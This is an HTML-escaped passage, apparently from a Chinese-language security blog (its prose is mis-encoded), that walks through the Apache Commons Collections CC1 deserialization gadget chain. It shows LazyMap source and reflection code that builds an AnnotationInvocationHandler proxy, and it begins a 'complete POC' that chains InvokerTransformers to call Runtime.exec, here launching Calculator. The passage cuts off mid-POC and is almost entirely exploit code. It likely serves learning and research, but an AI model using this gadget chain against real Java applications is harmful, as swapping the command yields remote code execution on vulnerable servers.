&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;kd&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;LazyMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Transformer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;factory&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;kd&#34;&gt;super&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;factory&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;IllegalArgumentException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Factory must not be null&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;factory&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;factory&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬å†ç”¨åå°„æ¥å†™ä¸€ä¸ªä»£ç†ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;forName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;sun.reflect.annotation.AnnotationInvocationHandler&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Constructor&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AnnotationInvocationHandlerConstructor&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getDeclaredConstructor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;AnnotationInvocationHandlerConstructor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;setAccessible&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;InvocationHandler&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Lazyhandler&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;InvocationHandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AnnotationInvocationHandlerConstructor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;newInstance&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SOAPMessageHandlers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;outerMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;proxyMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Proxy&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;newProxyInstance&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getClassLoader&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(),&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;outerMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getInterfaces&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Lazyhandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;InvocationHandler&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;handler&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;InvocationHandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AnnotationInvocationHandlerConstructor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;newInstance&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SOAPMessageHandlers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;proxyMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å®Œæ•´çš„POCï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;org.apache.commons.collections.Transformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;org.apache.commons.collections.functors.ChainedTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;org.apache.commons.collections.functors.ConstantTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;org.apache.commons.collections.functors.InvokerTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;org.apache.commons.collections.map.LazyMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;javax.jws.soap.SOAPMessageHandlers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.io.ByteArrayInputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.io.ByteArrayOutputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.io.ObjectInputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.io.ObjectOutputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.lang.reflect.Constructor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.lang.reflect.InvocationHandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.lang.reflect.Proxy&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.util.HashMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.util.Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;CC1_LazyMap&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Exception&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;Transformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;transformers&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Transformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ConstantTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Runtime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;InvokerTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;getMethod&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[].&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]{&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;getRuntime&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;InvokerTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;invoke&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[].&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]{&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;InvokerTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;exec&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;ChainedTransformer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;chainedTransformer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ChainedTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;transformers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;outerMap&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;LazyMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;decorate&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HashMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;chainedTransformer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;forName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;sun.reflect.annotation.AnnotationInvocationHandler&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;Constructor&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AnnotationInvocationHandlerConstructor&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getDeclaredConstructor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;AnnotationInvocationHandlerConstructor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;setAccessible&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;InvocationHandler&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Lazyhandler&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;InvocationHandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AnnotationInvocationHandlerConstructor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;newInstance&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SOAPMessageHandlers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;outerMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
